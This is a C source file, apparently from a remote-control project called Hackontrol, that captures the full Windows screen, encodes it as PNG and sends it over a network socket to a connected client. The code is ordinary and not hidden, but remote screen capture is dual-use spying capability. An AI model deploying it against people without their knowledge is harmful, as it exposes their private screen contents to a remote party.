#include "screenshot.h"
#include <khopanstring.h>
#include <khopanjava.h>
#include "exception.h"
#include <lodepng.h>

BOOL TakeScreenshot(JNIEnv* const environment, const SOCKET clientSocket) {
	HDC context = GetDC(NULL);
	int width = GetDeviceCaps(context, HORZRES);
	int height = GetDeviceCaps(context, VERTRES);
	HDC memoryContext = CreateCompatibleDC(context);
	HBITMAP bitmap = CreateCompatibleBitmap(context, width, height);
	HBITMAP oldBitmap = SelectObject(memoryContext, bitmap);
	BitBlt(memoryContext, 0, 0, width, height, context, 0, 0, SRCCOPY);
	bitmap = SelectObject(memoryContext, oldBitmap);
	DWORD size = width * height * 4;
	BYTE* buffer = LocalAlloc(LMEM_FIXED, size);
	BOOL returnValue = FALSE;

	if(!buffer) {
		HackontrolThrowWin32Error(environment, L"LocalAlloc");
		goto cleanup;
	}

	BITMAPINFOHEADER header = {sizeof(BITMAPINFOHEADER)};
	header.biWidth = width;
	header.biHeight = height;
	header.biPlanes = 1;
	header.biBitCount = 32;

	if(!GetDIBits(memoryContext, bitmap, 0, height, buffer, (LPBITMAPINFO) &header, DIB_RGB_COLORS)) {
		SetLastError(ERROR_FUNCTION_FAILED);
		HackontrolThrowWin32Error(environment, L"GetDIBits");
		LocalFree(buffer);
		goto cleanup;
	}

	BYTE* flippedImage = LocalAlloc(LMEM_FIXED, size);

	if(!flippedImage) {
		HackontrolThrowWin32Error(environment, L"LocalAlloc");
		LocalFree(buffer);
		goto cleanup;
	}

	for(int y = 0; y < height; y++) {
		for(int x = 0; x < width; x++) {
			int position = (y * width + x) * 4;
			int newPosition = ((height - y - 1) * width + x) * 4;
			flippedImage[position + 0] = buffer[newPosition + 2];
			flippedImage[position + 1] = buffer[newPosition + 1];
			flippedImage[position + 2] = buffer[newPosition + 0];
			flippedImage[position + 3] = buffer[newPosition + 3];
		}
	}

	LocalFree(buffer);
	BYTE* pngImage;
	size_t pngSize;
	unsigned int result = lodepng_encode32(&pngImage, &pngSize, flippedImage, width, height);

	if(result) {
		LPWSTR message = KHFormatMessageW(L"lodepng_encode32() %S (Error code: %u)", lodepng_error_text(result), result);

		if(!message) {
			goto freeFlippedImage;
		}

		KHJavaThrowInternalErrorW(environment, message);
		LocalFree(message);
		goto freeFlippedImage;
	}

	BYTE sizeBuffer[4];
	sizeBuffer[0] = (pngSize >> 24) & 0xFF;
	sizeBuffer[1] = (pngSize >> 16) & 0xFF;
	sizeBuffer[2] = (pngSize >> 8) & 0xFF;
	sizeBuffer[3] = pngSize & 0xFF;

	if(send(clientSocket, sizeBuffer, 4, 0) == SOCKET_ERROR) {
		SetLastError(WSAGetLastError());
		HackontrolThrowWin32Error(environment, L"send");
		free(pngImage);
		goto freeFlippedImage;
	}

	int status = send(clientSocket, pngImage, (int) pngSize, 0);
	free(pngImage);

	if(status == SOCKET_ERROR) {
		SetLastError(WSAGetLastError());
		HackontrolThrowWin32Error(environment, L"send");
		goto freeFlippedImage;
	}

	returnValue = TRUE;
freeFlippedImage:
	LocalFree(flippedImage);
cleanup:
	DeleteObject(bitmap);
	DeleteDC(memoryContext);
	ReleaseDC(NULL, context);
	return returnValue;
}
